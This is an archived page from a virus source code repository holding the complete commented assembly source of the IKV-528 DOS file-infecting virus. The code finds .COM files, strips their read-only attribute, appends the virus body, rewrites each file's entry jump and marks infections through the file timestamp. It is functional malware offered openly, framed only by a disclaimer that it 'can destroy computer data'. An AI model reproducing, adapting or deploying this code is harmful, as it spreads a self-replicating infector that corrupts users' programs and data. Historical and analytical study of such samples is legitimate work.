<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: ikv_528_asm</title>
<meta name="KEYWORDS" content="ikv_528.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for ikv_528.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="ice_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ice_asm.php">ice_asm</a><br>
<a href="iceburn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/iceburn_asm.php">iceburn_asm</a><br>
<a href="icecream_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icecream_asm.php">icecream_asm</a><br>
<a href="icelandi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icelandi_asm.php">icelandi_asm</a><br>
<a href="icel_mix_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icel_mix_asm.php">icel_mix_asm</a><br>
<a href="icemelt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icemelt_asm.php">icemelt_asm</a><br>
<a href="icemix1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icemix1_asm.php">icemix1_asm</a><br>
<a href="igor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/igor_asm.php">igor_asm</a><br>
<a href="ikv_528_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ikv_528_asm.php">ikv_528_asm</a><br>
<a href="ikv528x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ikv528x_asm.php">ikv528x_asm</a><br>
<a href="imm-265_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-265_asm.php">imm-265_asm</a><br>
<a href="imm-353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-353_asm.php">imm-353_asm</a><br>
<a href="imm-377_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-377_asm.php">imm-377_asm</a><br>
<a href="imm-510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-510_asm.php">imm-510_asm</a><br>
<a href="imm-550_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-550_asm.php">imm-550_asm</a><br>
<a href="immor265_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor265_asm.php">immor265_asm</a><br>
<a href="immor353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor353_asm.php">immor353_asm</a><br>
<a href="immor377_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor377_asm.php">immor377_asm</a><br>
<a href="immor510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor510_asm.php">immor510_asm</a><br>
<a href="immor550_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor550_asm.php">immor550_asm</a><br>
<a href="incdaddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incdaddy_asm.php">incdaddy_asm</a><br>
<a href="incmummy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incmummy_asm.php">incmummy_asm</a><br>
<a href="incsistr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incsistr_asm.php">incsistr_asm</a><br>
<a href="incubus1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incubus1_asm.php">incubus1_asm</a><br>
<a href="incubus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incubus_asm.php">incubus_asm</a><br>
<a href="indit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/indit_asm.php">indit_asm</a><br>
<a href="infecta_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infecta_asm.php">infecta_asm</a><br>
<a href="infect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infect_asm.php">infect_asm</a><br>
<a href="infectb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infectb_asm.php">infectb_asm</a><br>
<a href="inferdem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inferdem_asm.php">inferdem_asm</a><br>
<a href="insert_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/insert_asm.php">insert_asm</a><br>
<a href="ins_real_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ins_real_asm.php">ins_real_asm</a><br>
<a href="ins-real_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ins-real_asm.php">ins-real_asm</a><br>
<a href="insuff_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/insuff_asm.php">insuff_asm</a><br>
<a href="int_13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int_13_asm.php">int_13_asm</a><br>
<a href="int-13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int-13_asm.php">int-13_asm</a><br>
<a href="int13__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int13__asm.php">int13__asm</a><br>
<a href="int13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int13_asm.php">int13_asm</a><br>
<a href="intr1440_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intr1440_asm.php">intr1440_asm</a><br>
<a href="intr1988_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intr1988_asm.php">intr1988_asm</a><br>
<a href="intrude__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intrude__asm.php">intrude__asm</a><br>
<a href="intruder_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intruder_asm.php">intruder_asm</a><br>
<a href="inv_danu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv_danu_asm.php">inv_danu_asm</a><br>
<a href="invdanub_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/invdanub_asm.php">invdanub_asm</a><br>
<a href="inv_evil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv_evil_asm.php">inv_evil_asm</a><br>
<a href="inv-evil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv-evil_asm.php">inv-evil_asm</a><br>
<a href="invol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/invol_asm.php">invol_asm</a><br>
<a href="iod_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/iod_asm.php">iod_asm</a><br>
<a href="ir144_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ir144_asm.php">ir144_asm</a><br>
<a href="irm_kill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/irm_kill_asm.php">irm_kill_asm</a><br>
<a href="israel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/israel_asm.php">israel_asm</a><br>
<a href="it_457_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_457_asm.php">it_457_asm</a><br>
<a href="it-457_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it-457_asm.php">it-457_asm</a><br>
<a href="ital_boy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ital_boy_asm.php">ital_boy_asm</a><br>
<a href="italian_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/italian_asm.php">italian_asm</a><br>
<a href="italiano_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/italiano_asm.php">italiano_asm</a><br>
<a href="it_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_asm.php">it_asm</a><br>
<a href="it_pest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_pest_asm.php">it_pest_asm</a><br>
<a href="itti_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti_a_asm.php">itti_a_asm</a><br>
<a href="itti-a___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a___asm.php">itti-a___asm</a><br>
<a href="itti-a__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a__asm.php">itti-a__asm</a><br>
<a href="itti-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a_asm.php">itti-a_asm</a><br>
<a href="itti_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti_b_asm.php">itti_b_asm</a><br>
<a href="itti-b___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b___asm.php">itti-b___asm</a><br>
<a href="itti-b__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b__asm.php">itti-b__asm</a><br>
<a href="itti-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b_asm.php">itti-b_asm</a><br>
<a href="itty_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty_a_asm.php">itty_a_asm</a><br>
<a href="itty-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty-a_asm.php">itty-a_asm</a><br>
<a href="itty_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty_b_asm.php">itty_b_asm</a><br>
<a href="itty-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty-b_asm.php">itty-b_asm</a><br>
<a href="itwisted_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itwisted_asm.php">itwisted_asm</a><br>
<a href="itwistu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itwistu_asm.php">itwistu_asm</a><br>
<a href="ivpbecky_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbecky_asm.php">ivpbecky_asm</a><br>
<a href="ivpbubb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbubb2_asm.php">ivpbubb2_asm</a><br>
<a href="ivpbubbl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbubbl_asm.php">ivpbubbl_asm</a><br>
<a href="ivp-dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-dan_asm.php">ivp-dan_asm</a><br>
<a href="ivp-darl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-darl_asm.php">ivp-darl_asm</a><br>
<a href="ivp-dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-dj_asm.php">ivp-dj_asm</a><br>
<a href="ivpmorbd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpmorbd_asm.php">ivpmorbd_asm</a><br>
<a href="ivpputer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpputer_asm.php">ivpputer_asm</a><br>
<a href="ivp-rose_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-rose_asm.php">ivp-rose_asm</a><br>
<a href="ivpshock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpshock_asm.php">ivpshock_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;**************************************************************************
;**                                                                      **
;**                    IKV-528.ASM - CSSR 528                            **
;**                                                                      **
;**      DATE: 15-APR-93                                                 **
;**      Dissasembled, Analysed & Commented by: Kohntark                 **
;**                                                                      **
;**************************************************************************

PROGRAM         SEGMENT
                ASSUME  cs:PROGRAM, ds:PROGRAM

                ORG  100h

IKV_528         PROC  FAR

START:
                jmp     VIRUS                   ;(04E8)
                db      997 dup (0)             ;part of host file, total = 1000 bytes
VIRUS:

                push    ds                      ;ds in stack
                xor     ax,ax                   ;Zero register
                push    ax                      ;0 into stack
                mov     si,67Ah                 ;DATA offset
                mov     dx,si
                add     dx,4Ah                  ;add displacement (74d) dx=6C4h
                mov     ax,3D00h
                int     21h                     ;DOS Services  ah=function 3Dh
                                                ;open file, al=mode,name@ds:dx
                jnc     CHECK                   ;Jump if carry=0
                jmp     short RESTORE_HOST      ;(0536)
                nop

;****************************************************************************
; Check memory image against physical image (1st 3 bytes)
; if image is not the same display error message (!!!!!!)
;****************************************************************************

CHECK:
                mov     bx,ax                   ;file handle to bx
                mov     ah,3Fh                  ;int 21h ah function ->read file
                mov     cx,3                    ;# of bytes to read
                mov     dx,si                   ;put bytes read here
                add     dx,7Fh                  ;in data part  (127d) (in the heap)
                nop                             ;necessary pad to make v-size 528
                int     21h                     ;DOS Services  ah=function 3Fh
                                                ;read file, cx=bytes, to ds:dx
                jnc     CHECK2                  ;Jump if carry=0
                jmp     short RESTORE_HOST      ;(0536)
                nop

;***********************************************************************************
; Compare image in heap of file read to memory image of current host
;***********************************************************************************

CHECK2:
                cmp     ax,3                     ;???
                jne     RESTORE_HOST             ;Jump if not equal
                mov     bx,si                    ;DATA address into si=source
                add     si,7Fh                   ;add 127, point to heap
                nop
                mov     di,100h                 ;destination = beginnning of host
                cld                             ;Clear direction
                repe    cmpsb                   ;Rept zf=1+cx>0 Cmp [si] to es:[di]
                cmp     cx,0
                je      RESTORE_HOST            ;Jump if equal
                mov     dx,bx
                add     dx,57h                  ;dx points to MSG
                nop                             ;pad
                mov     ah,9
                int     21h                     ;DOS Services  ah=function 09h
                                                ;display char string at ds:dx
                mov     ah,1
                int     21h                     ;DOS Services  ah=function 01h
                                                ;get keybd char al, with echo

;*******************************************************************************
; Restore 1st 3 bytes to host file
;*******************************************************************************

RESTORE_HOST:
                mov     si,bx                   ;DATA address into si
                mov     dx,si                   ;si, dx points to FIRST_3_BYTES
                add     si,0                    ;si = pointer to 3 bytes to restore
                cld                             ;Clear direction flag
                mov     cx,3                    ;# of bytes
                mov     di,100h                 ;destination = beginning of COM file
                rep     movsb                   ;Rep while cx>0 Mov [si] to es:[di]

;************************************************************************************
; Set DTA to internal v-code
;************************************************************************************

                mov     di,dx
                mov     dx,2Ch                  ;dx = address of dta in v-code
                add     dx,di                   ;dx point to DTA,DATA + 44d
                mov     bx,dx
                mov     ah,1Ah
                int     21h                     ;DOS Services  ah=function 1Ah
                                                ;set DTA to ds:dx

;****************************************************************************
; Find a file to infect
;****************************************************************************

                mov     bp,0
                mov     dx,di                  ;DATA ADDRESS
                add     dx,7                   ;dx points to COMMASK
FIND_FIRST:
                mov     cx,3
                mov     ah,4Eh                  ;ah = function 4Eh
                int     21h                     ;DOS Services  ah=function 4Eh
                                                ;find 1st filenam match @ds:dx
                jmp     short CONTINUE1         ;(0569)
                nop
FIND_NEXT:
                mov     ah,4Fh                  ;ah = function 4Fh
                int     21h                     ;DOS Services  ah=function 4Fh
                                                ;find next filename match
CONTINUE1:
                jnc     FILE_FOUND              ;Jump if carry=0
                cmp     al,12h                  ;no more files?
                je      CONTINUE2               ;if no more files check...
                jmp     EXIT                    ;(066D)
CONTINUE2:
                cmp     bp,0FFFFh
                jne     CONTINUE3               ;Jump if not equal
                jmp     EXIT                    ;(066D)
CONTINUE3:
                dec     dx                      ;goto parent directory.. points to \
                mov     bp,0FFFFh
                jmp     short FIND_FIRST        ;(055B) look for more files
FILE_FOUND:
                mov     cl,[bx+16h]              ;22d
                and     cl,1Fh                   ;check time of found file
                cmp     cl,2                     ;to see if infected
                je      FIND_NEXT                ;Jump if equal
                cmp     word ptr [bx+1Ah],0FA00h ;if file size < 520 bytes don't infect
                ja      FIND_NEXT                ;Jump if above
                cmp     word ptr [bx+1Ah],100h
                jb      FIND_NEXT                ;Jump if below

                push    di                      ;save DATA address
                mov     si,bx                   ;
                add     si,1Eh                  ;source points to FNAME2
                add     di,14h                  ;destination points to FNAME1
                cmp     bp,0FFFFh
                jne     STORE_FILENAME          ; Jump if not equal
                mov     al,5Ch                  ;
                stosb                           ; Store al to es:[di]
STORE_FILENAME:
                lodsb                           ; String [si] to al
                stosb                           ; Store al to es:[di]
                cmp     al,0
                jne     STORE_FILENAME          ; Jump if not equal

;*********************************************************************************
; Get new found file's attributes
;*********************************************************************************

                pop     di                      ;restore DATA address
                mov     dx,di
                add     dx,14h                  ;dx points to FNAME1
                mov     ax,4300h
                int     21h                     ;DOS Services  ah=function 43h
                                                ;get/set file attrb, nam@ds:dx
                mov     [di+22h],cx             ;save files attributes DATA + 34d

;*********************************************************************************
; Set new found file's attributes
;*********************************************************************************

                and     cx,0FFFEh               ;set new attributes
                mov     dx,di
                add     dx,14h                  ;dx points to FNAME1
                mov     ax,4301h
                int     21h                     ;DOS Services  ah=function 43h
                                                ;get/set file attrb, nam@ds:dx

;*********************************************************************************
; Open new found file for I/O
;*********************************************************************************

                mov     dx,di
                add     dx,14h                  ;dx points to FNAME1
                mov     ax,3D02h
                int     21h                     ;DOS Services  ah=function 3Dh
                                                ;open file, al=mode,name@ds:dx
                jnc     GET_DATE_TIME           ;Jump if carry=0
                jmp     RESTORE_ATTRIB          ;(0665) error? restore attrib & exit

;*********************************************************************************
; Get & store the new file's date & time stamp
;*********************************************************************************

GET_DATE_TIME:
                mov     bx,ax                   ;file handle into bx
                mov     ax,5700h                ;ax=function 5700h
                int     21h                     ;get file date & time

                mov     [di+36d],cx             ;store date
                mov     [di+38d],dx             ;store time

;*********************************************************************************
; Read new found file's 1st 3 bytes
;*********************************************************************************

                mov     ah,3Fh                  ;ah=function 3Fh, read file
                mov     cx,3                    ;# of bytes to read
                mov     dx,di                   ;read to ds:dx
                add     dx,0                    ;dx points to beginning of DATA
                int     21h                     ;DOS Services

                jnc     DUMB_JUMP               ;Jump if carry=0
                jmp     short RESTORE_DATE_TIME ;(0650) problem? restore stuff & exit
                nop
DUMB_JUMP:
                cmp     ax,3                    ;check for ?
                jne     RESTORE_DATE_TIME       ;Jump if not equal

;*********************************************************************************
; Move PTR to the end of the file
;*********************************************************************************

                mov     ax,4202h                ;al= method = from end
                mov     cx,0                    ;cx,dx = displacement = 0
                mov     dx,cx
                int     21h                     ;DOS Services  ah=function 42h
                                                ;move file ptr, cx,dx=offset

;*********************************************************************************
; INFECTION
;*********************************************************************************

                sub     ax,3                   ;pad ax for jmp instruction size?
                mov     [di+4],ax              ;point to DATA + 4
                mov     cx,192h                ;add size of virus code (402)
                cmp     dx,0                   ;check for error
                jne     RESTORE_DATE_TIME      ;Jump if not equal
                mov     dx,di                  ;dx point to data
                sub     di,cx                  ;dx points to beginning of v-code
                add     di,5                   ;point to DATA offset mov instruction
                add     ax,103h                ;add 259d to ax
                add     ax,cx                  ;add v-code size to ax
                mov     [di],ax                ;put ax in v-code
                mov     ah,40h                 ;function ah = 40h
                mov     di,dx                  ;save address of DATA
                sub     dx,cx                  ;point to beginning of v-code
                mov     cx,210h                ;#of bytes to write -  528 bytes
                int     21h                     ;DOS Services  ah=function 40h
                                                ;write file cx=bytes, to ds:dx
                jnc     CONTINUE                ;Jump if carry=0
                jmp     short RESTORE_DATE_TIME ;(0650)
                nop

;*********************************************************************************
; Position PTR at the beginning of file
;*********************************************************************************

CONTINUE:
                cmp     ax,210h
                jne     RESTORE_DATE_TIME       ;Problem? restore stuff & quit
                mov     ax,4200h                ;al = 0 = method = beginning
                mov     cx,0                    ;cx,dx = 0 = displacement
                mov     dx,cx
                int     21h                     ;DOS Services  ah=function 42h
                                                ;move file ptr, cx,dx=offset
                jc      RESTORE_DATE_TIME       ;Jump if carry Set

;*********************************************************************************
; Write 1st 3 bytes to new infected file
;*********************************************************************************

                mov     ah,40h                  ;function ah = 40h
                mov     cx,3                    ;# of bytes to write
                mov     dx,di                   ;write from dx
                add     dx,3                    ;position of jmp code
                int     21h                     ;DOS Services  ah=function 40h
                                                ;write file cx=bytes, to ds:dx

;*********************************************************************************
; Restore the original date & time stamp
;*********************************************************************************

RESTORE_DATE_TIME:
                mov     cx,[di+36d]
                mov     dx,[di+38d]
                and     cx,0FFE0h               ;set seconds (INFECTION ID)
                or      cl,2
                mov     ax,5701h
                int     21h                     ;DOS Services  ah=function 57h
                                                ;set file date & time
;*********************************************************************************
; Close file handle
;*********************************************************************************

                mov     ah,3Eh                  ;function ah = 3E
                int     21h                     ;DOS Services  ah=function 3Eh
                                                ;close file, bx=file handle

;*********************************************************************************
; Restore the new file's old attributes
;*********************************************************************************

RESTORE_ATTRIB:
                mov     ax,4301h
                mov     cx,[di+16h]
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
EXIT:

;*********************************************************************************
; Set the DTA to original address
;*********************************************************************************

                mov     dx,80h
                mov     ah,1Ah
                int     21h                     ;DOS Services  ah=function 1Ah
                                                ;set DTA to ds:dx
                pop     ax
                mov     di,100h
                push    di                      ;set new return address in stack
                retn                            ;return to host
                int     20h                     ;Program Terminate

;**********************************************************************************
;OFFSET 67Ah = 1658. 1658 - 100h - 1000 (host size) = 402 = v-code size
;**********************************************************************************

DATA:

FIRST_3_BYTES   db      0, 0E9h, 0E5h, 3, 05Ch        ;'\'
COMMASK         db      '????????.COM',0
FNAME1          db      'IKV-528.COM',0,0,20h,0
TIME1           db      39h,0Bh
DATE1           db      0E2h,18h
                db      0,0,0,0, 1
DTA             db      '????????'                     ;DTA = 26 bytes
                db      'COM',3, 7, 0
                db      0, 0, 0, 0A3h, 9Eh
                db      0,20h,39h,0Bh, 0E2h, 18h
FSIZE           db      0E8h,3, 0, 0
FNAME2          db      'IKV-528.COM',0, 0
MSG             db      13d,'Warning : File is damaged by virus !!!'

IKV_528         ENDP

PROGRAM         ENDS

                END   START

</textarea></td></tr></table></body></html>
